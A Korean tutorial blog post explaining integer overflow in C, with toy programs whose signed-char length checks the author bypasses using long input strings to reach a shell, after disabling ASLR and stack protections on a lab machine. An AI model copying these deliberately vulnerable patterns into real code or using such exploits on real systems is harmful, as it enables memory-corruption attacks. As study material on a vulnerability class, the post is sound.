# Integer overflow

> 작성자 : f.killrra
>
> 작성일 : 2018-07-19

오늘은 정수 오버플로우라고 불리는 취약점에 대해 소개를 할까한다.
~~(사실 heap에 대해 공부했는데 내 이해력이 똥이라 문서를 못만들고 현재 시간 8:00 am 어쩔 수 없다.ㅠ.ㅠ)~~
~~멘붕와서 자려고 했는데 정모가 실망하는 모습이 떠오른다...작성하도록 하자.~~

대부분 첫 번째 언어로 공부하는 것이 C 언어 일것이다.
그리고 C언어 책에는 당연스럽게 변수에 대한 type을 책의 앞부분에 소개하는 것이 일반적이다.

프로그래밍을 하다보면 많이 사용되는 변수,
프로그래머들은 종종 범위를 넘길 것을 생각하지 않는 실수를 저지른다. Exploit에 직접적으로 사용되지는 않지만 예상하지 못한 값에 의해 잠재적인 위험성을 가지게 한다.

우리는 하나의 바이너리를 통해 Exploit까지 해보자.

### > 관심을 갖게 된 계기

먼저 이 취약점에 대해 관심을 갖게 된 계기는 다름아닌 hackerschool의 LOB 문제를 풀면서 생기기 시작했다.
보통 LOB는 바이너리의 소스코드안에 memory에 대한 방어기법을 넣는데, 이 때 종종 들어가는 것이 argc에 대한 값을 체크하는 조건문이다. 예를 들면 아래와 같다.

> ex) if(argc < 2)
> 		return 0;

이렇게 argc 즉 인자가 몇개 들어갔나~ 를 체크하여 argv에 들어가는 값에 대한 메모리 보호를 이어가는데..
이때 main함수에서 argc가 int형으로 선언이 되었으니! 당연히 integer overflow를 일으켜서! argc 값을 체크하는 조건문을 우회(bypass)할 수 있지 않을까~? 하는 생각을 하곤 했다.

그래서 바이너리를 직접 만들어봤다.

```
fkillrra@ubuntu  ~/Study/Integer_overflow  vi argc_overflow.c
1 #include <stdio.h>
2 
3 int main(int argc, char *argv[])
4 {
5     printf("argc is : %d\n", argc);
6     return 0;
7 }
```

이렇게 만든 바이너리를 m32 옵션을 주어 gcc 로 컴파일 하였다.

```
fkillrra@ubuntu  ~/Study/Integer_overflow  gcc -m32 -o argc_overflow argc_overflow.c
```

이렇게 컴파일이 완료된 바이너리에 integer overflow를 시도해보았다.

```
fkillrra@ubuntu  ~/Study/Integer_overflow  ./argc_overflow `python -c 'print "\x00"*2147483647'`
Traceback (most recent call last):
  File "<string>", line 1, in <module>
MemoryError
argc is : 1
 fkillrra@ubuntu  ~/Study/Integer_overflow  
```

어래..? argc is : 1이 나왔는데 에러 메시지가 보인다.
구글링을 시전했다.

![helpmegoogle](https://user-images.githubusercontent.com/40850499/42912900-d1ddeabe-8b2c-11e8-99c0-f196b440a3b2.PNG)

~~음...영어 너무 싫다ㅠ~~

하지만 좀 더 알아보니 이는 운영체제단에서 막는 것이라고 결론을 내렸다.

자 그렇다면 결론이 나왔다.
main() 에서의 argc Integer overflow는 안된다.

------

### > 시작한거 무라도 쓸어보자;

자자. 이 문서의 진가는 이제 발휘된다. 혹시라도 서문을 읽고 뒤로가기 하는 친구가 있다면 다시 얘기하도록하자.

재밌는 사례를 들며 시작을 하려고한다.

> "강남 스타일" 이라는 노래 다들 알것이다. 이 노래가 너무 인기가 많아서 유튜브에 조회수가 굉장히 올라갔던것으로 기억을 하고 있을것이다. 당시 유튜브 조회수가 21억 view가 넘어가기 시작했는데 유튜브는 재생 횟수를 32bit로 표현하고 있어서 2,147,483,647까지 밖에 표현을 할 수 없었다.
> 결국 조회수가 2,147,483,647가 넘어갔고 넘어가는 순간 - 2,147,483,648이 되어 조회수가 가장 낮은 영상이 되어버렸던 잠깐의 해프닝이 있었다.

물론 구글에서는 사전에 이미 64bit 로 업그레이드를 했지만 놀라움에 대한 표시로 음수로 바뀌도록 그대로 두었다고 한다.

위의 사례에서와 마찬가지로 정수 오버플로우로 인해 어떤 취약점이 발생하고 이를 어떻게 공격할 수 있는지 알아보자. (Ret's pwn!)

------

### 정수 오버플로우

> 정수 오버플로우란 위에서 설명했던 것과 같이 변수에 담을 수 있는 값의 최대값을 초과하여 발생한다.

컴퓨터는 음수를 표현할 때 첫 번째 바이트 수를 음수 비트로 사용한다. 
char 형을 예로 설명하겠다.

char 형의 변수는 1byte 즉 8bit 이다. 이 중 1bit를 음수여부를 표현하고 나머지 7bit를 사용할 수 있으므로 2^7= 128개의 수를 표현 할 수 있다.

이를 2진수로 표현을 해보면 아래와 같다.

> 1 = 0000 0001
> 127 = 0111 1111
>
> -128 = 1000 0000
> -1 = 1111 1111

문제는 위에서 127에서 +1을 하면 128이 되는 것이 아니라 -128이 되는 것을 확인 할 수 있다.

프로그래머가 이러한 점을 실수한다면 이 변수에 의해 어떤 버그가 발생할지 모르는 상태가 되어버린다.

이제 int type 에서도 생각을 해보자.
int 형의 범위는 아래와 같다.

| int  | –2,147,483,648 ~ 2,147,483,647 |
| :--: | :----------------------------: |

보다시피 –2,147,483,648 ~ 2,147,483,647 이다.
우리는 int 의 max 값인 2,147,483,647를 넣고 +1을 하였을 때 실제 바이너리가 어떤 값을 도출해 내는지 알아볼 필요가 있다.

그래서 필자는 아래와 같은 바이너리를 하나 만들어 줬다.

```
fkillrra@ubuntu  ~/Study/Integer_overflow  vi int.c
  1 #include <stdio.h>
  2 
  3 int main()
  4 {
  5     int test = 2147483647;
  6     printf("int max : %d\n", test);
  7     printf("int max + 1 : %d\n", test+1);
  8     return 0;
  9 }
fkillrra@ubuntu  ~/Study/Integer_overflow  gcc -o int int.c 
fkillrra@ubuntu  ~/Study/Integer_overflow  ./int 
int max : 2147483647
int max + 1 : -2147483648
```

이후 컴파일 과정을 거치고, 실행을 했을때 test+1의 값이 -2147483648이 나오는 것을 확인 할 수 있었다.

그렇다면 unsigned 를 생각해볼 수 있다.

하지만 이 또한 마찬가지로 취약하다.

> unsigned int 의 범위는 0 ~ 4,294,967,295 까지 인데 최대 값에 +1을 하게 되면 0이 되어 버린다.

이렇게 모든 변수는 최대값이 존재하므로 오버플로우가 발생할 가능성이 다분하다.

------

### 정수 오버플로우 Exploit

> 이제 정수 오버플로우가 어떻게 실제 공격에 활용될 수 있는지 알아보자.

먼저 간단한 예제를 살펴보자.

```
fkillrra@ubuntu  ~/Study/Integer_overflow  vi vuln.c
  1 #include <stdio.h>
  2 #include <string.h>
  3 
  4 int main(int argc, char *argv[])
  5 {
  6     char len = 0;
  7     char buf[30] = {0,};
  8 
  9     len = strlen(argv[1]);
 10     if(len > 30)
 11         printf("Error! Max size : 30\n");
 12     else
 13     {
 14         printf("Vuln!\n");
 15         strcpy(buf, argv[1]);
 16     }
 17 
 18     return 0;
 19 }
fkillrra@ubuntu  ~/Study/Integer_overflow  gcc -o vuln vuln.c 
fkillrra@ubuntu  ~/Study/Integer_overflow  ./vuln `python -c 'print "A"*40'`
Error! Max size : 30
```

30개 이상의 문자열을 입력했을 때 if(len > 30) 이라는 조건문에 걸려서 Error! Max size : 30을 출력하고 바이너리가 종료되는 간단한 예제이다.

그러나 signed char는 128 이상의 수를 음수로 인식하므로 문자열을 128개 이상 입력했을 때 if 문을 통과할 수 있다.

```
 fkillrra@ubuntu  ~/Study/Integer_overflow  ./vuln `python -c 'print "A"*130'`
Vuln!
*** stack smashing detected ***: ./vuln terminated
[1]    91197 abort (core dumped)  ./vuln `python -c 'print "A"*130'`
```

stack smashing 이 떳지만 Vuln! 이 출력되는 것을 보아 if문을 통과 하였다는 것을 알 수 있다.

이처럼 정수 오버플로우로 인해서 예상치 못한 분기문으로 분기가 되거나, 메모리 할당을 제대로 받지 못해 공격 가능성이 생긴다.

> Exploit하기 위해 모든 메모리 보호기법을 해제하였고, gcc의 m32옵션을 주어 32bit 바이너리로 컴파일 하였다. ~~(약간의 꼼수)~~ 본질적인 취약점의 원인을 알아보고 Exploit하는것이 목적이다. ^__^

[GCC option]

> fkillrra@ubuntu  ~/Study/Integer_overflow  gcc -z execstack -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -o vuln_example vuln_example.c

[ASLR 해제] // root 계정으로 설정하여야 가능하다. (su)

>  ⚡ root@ubuntu  /home/fkillrra/Study/Integer_overflow  echo 0 > /proc/sys/kernel/randomize_va_space 
>  ⚡ root@ubuntu  /home/fkillrra/Study/Integer_overflow  cat /proc/sys/kernel/randomize_va_space 
> 0

[checksec 으로 확인]

>  fkillrra@ubuntu  ~/Study/Integer_overflow  checksec vuln_example
> [*] '/home/fkillrra/Study/Integer_overflow/vuln_example'
>     Arch:     i386-32-little
>     RELRO:    Partial RELRO
>     Stack:    No canary found
>     NX:       NX disabled
>     PIE:      No PIE (0x8048000)
>     RWX:      Has RWX segments

[Vuln_example.c]

```
  1 #include <stdio.h>
  2 #include <string.h>
  3 
  4 int main(int argc, char *argv[])
  5 {
  6     char buf[300];
  7     char len = 0;
  8 
  9     strcpy(buf, argv[1]);
 10     len = strlen(buf);
 11     if(len > 300)
 12     {
 13         printf("Error! Max size : 300\n");
 14         return 0;
 15     }
 16 
 17     else if(len > 0 && len < 300)
 18     {
 19         printf("fkillrra is genius! but not good at hacking..\n");
 20         return 0;
 21     }
 22 
 23     else
 24     {
 25         printf("I'm 9#\n");
 26         system("/bin/bash");
 27     }
 28 
 29     return 0;
 30 }
```

이제 여기서 생기는 정수 오버플로우를 이용하여 공격하면 된다.

간단하게 임의로 작성한것이기 때문에 정수 오버플로우 외에도 여러가지 공격이 가능할것으로 예상이 된다.
하지만 이 문제는 정수 오버플로우를 실습하기 위해 만들어졌으므로 이를 이용하여 공격해보자.

페이로드는 간단하다.

먼저 char 는 overflow 가 128일때 나타나기 때문에 이 만큼의 문자열을 넣어주면 깔끔하게 쉘을 띄울 수 있다.

```
fkillrra@ubuntu  ~/Study/Integer_overflow  ./vuln_example `python -c 'print "A"*128'`
I'm 9#
fkillrra@ubuntu:~/Study/Integer_overflow$ id
uid=1000(fkillrra) gid=1000(fkillrra) groups=1000(fkillrra),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
fkillrra@ubuntu:~/Study/Integer_overflow$ whoami
fkillrra
fkillrra@ubuntu:~/Study/Integer_overflow$ 
```

like this..

이상 integer overflow에 대해 알아보았다.